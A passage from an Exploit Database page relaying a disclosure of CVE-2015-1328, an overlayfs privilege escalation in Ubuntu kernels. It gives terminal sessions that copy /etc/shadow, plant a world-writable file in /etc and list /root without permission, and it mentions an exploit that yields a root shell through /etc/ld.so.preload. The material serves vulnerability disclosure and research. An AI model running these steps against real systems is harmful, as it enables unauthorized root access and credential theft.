a root-owned file:  (Note that the workdir= option is not needed on older kernels)  user () ubuntu-server-1504:~$ ./create-namespace root () ubuntu-server-1504:~# mount -t overlay -o lowerdir=/etc,upperdir=upper,workdir=work overlayfs o root () ubuntu-server-1504:~# chmod 777 work/work/ root () ubuntu-server-1504:~# cd o root () ubuntu-server-1504:~/o# mv shadow copy_of_shadow (exit the namespace) user () ubuntu-server-1504:~$ ls -al upper/copy_of_shadow -rw-r----- 1 root shadow 1236 May 24 15:51 upper/copy_of_shadow user () ubuntu-server-1504:~$ stat upper/copy_of_shadow /etc/shadow|grep Inode Device: 801h/2049d      Inode: 939791      Links: 1 Device: 801h/2049d      Inode: 277668      Links: 1  Now we can place this file in /etc by switching "upper" to be the lowerdir option, the permission checks pass since the file is owned by root and root can write to /etc.  user () ubuntu-server-1504:~$ ./create-namespace root () ubuntu-server-1504:~# mount -t overlay -o lowerdir=upper,upperdir=/etc,workdir=work overlayfs o root () ubuntu-server-1504:~# chmod 777 work/work/ root () ubuntu-server-1504:~# cd o root () ubuntu-server-1504:~/o# chmod 777 copy_of_shadow root () ubuntu-server-1504:~/o# exit user () ubuntu-server-1504:~$ ls -al /etc/copy_of_shadow -rwxrwxrwx 1 root shadow 1236 May 24 15:51 /etc/copy_of_shadow  The attached exploit gives a root shell by creating a world-writable /etc/ld.so.preload file. The exploit has been tested on the most recent kernels before 2015-06-15 on Ubuntu 12.04, 14.04, 14.10 and 15.04.  It is also possible to list directory contents for any directory on the system regardless of permissions:  nobody () ubuntu-server-1504:~$ ls -al /root ls: cannot open directory /root: Permission denied nobody () ubuntu-server-1504:~$ mkdir o upper work nobody () ubuntu-server-1504:~$ mount -t overlayfs -o lowerdir=/root,upperdir=/home/user/upper,workdir=/home/user/work overlayfs /home/user/o nobody () ubuntu-server-1504:~$ ls -al o 2>/dev/null total 8 drwxrwxr-x 1 root nogroup 4096 May 24 16:33 . drwxr-xr-x 8 root nogroup 4096 May 24 16:33 .. -????????? ? ?    ?          ?            ? .bash_history -????????? ? ?    ?          ?            ? .bashrc d????????? ? ?    ?          ?            ? .cache -????????? ? ?    ?          ?            ? .lesshst d????????? ? ?    ?          ?            ? linux-3.19.0   Credit ================================ Philip Pettersson, Samsung SDS Security Center  References ================================ [1] [https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/vivid/commit/?id=78ec4549](https://git.launchpad.net/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/vivid/commit/?id=78ec4549) [2] <https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt> [3] <http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html>     References: <http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-1328> <http://seclists.org/oss-sec/2015/q2/717> <http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html> <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1328> ``` [Comment 1](show_bug.cgi?id=934950#c1)  Andreas Stieger   2015-06-16 15:28:28 UTC  ``` Exploit fails on openSUSE 13.2 3.16.7-21-desktop x86_64  $ ./ofs  spawning threads mount #1 no FS_USERNS_MOUNT for overlayfs on this kernel child threads done exploit failed  This is mentioned to be specific to Ubuntu kernels, (FS_USERNS_MOUNT for overlayfs).

The problem is Ubuntu specific. ``` |  |

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
